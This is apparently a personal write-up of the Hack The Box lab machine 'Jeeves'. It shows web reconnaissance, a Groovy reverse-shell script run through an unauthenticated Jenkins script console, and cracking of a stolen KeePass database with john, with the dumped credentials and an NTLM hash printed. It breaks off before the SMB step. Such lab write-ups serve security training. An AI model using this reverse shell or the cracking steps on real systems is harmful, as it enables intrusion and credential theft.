```bash
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.10.10.63:50000/ 
http://10.10.10.63:50000/ [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], IP[10.10.10.63], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.10.63:50000                                       
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 404 Not Found</title>
</head>
<body><h2>HTTP ERROR 404</h2>
<p>Problem accessing /. Reason:
<pre>    Not Found</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>

</body>
</html>
```

Accessing to the website we find this error, which tells us about the server app running

![[Pasted image 20230815105841.png]]

Googling it we found the CVE-2021-28164 exploit and we try **[this POC](https://www.exploit-db.com/exploits/50438)** but it doesn't work. After dir busting with gobuster we found the url http://10.10.10.63:50000/askjeeves/ where we find the jenkins server (v2.87) for the app running in http://10.10.10.63:80/ application. After checking for some info we found the script console and running the following script we got a reverse shell

```bash
String host="10.10.14.14";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

-------------------------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443                                         
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami          
whoami
jeeves\kohsuke
```

And we check the Windows Exploit Suggester. We have tried MS16-098 and MS16-135 but they don't work. So lets try to find something useful

```shell
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
```

In the Documents directory we found a keepass database file, so move it to our attack machine and lets try to crack it with john

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ locate keepass2john 
/usr/sbin/keepass2john

┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ /usr/sbin/keepass2john CEH.kdbx > keepass.hash

┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ john -w=/usr/share/wordlists/rockyou.txt keepass.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
1g 0:00:00:46 DONE (2023-08-15 11:38) 0.02159g/s 1187p/s 1187c/s 1187C/s mwuah..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we got the password moonshine1. Now with kpcli app we open the database file 

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ kpcli --kdb CEH.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.
kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/> show -f 0

 Path: /CEH/
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes:
kpcli:/> show -f 1

 Path: /CEH/
Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/> show -f 2

 Path: /CEH/
Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/> show -f 3

 Path: /CEH/
Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/> show -f 4

 Path: /CEH/
Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/> show -f 5

 Path: /CEH/
Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/> show -f 6

 Path: /CEH/
Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/> show -f 7

 Path: /CEH/
Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```

We collect the password into a list

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Jeeves-10.10.10.63]
└─$ cat passwords                        
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password
```

And we got a hash `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`

Now lets try in SMB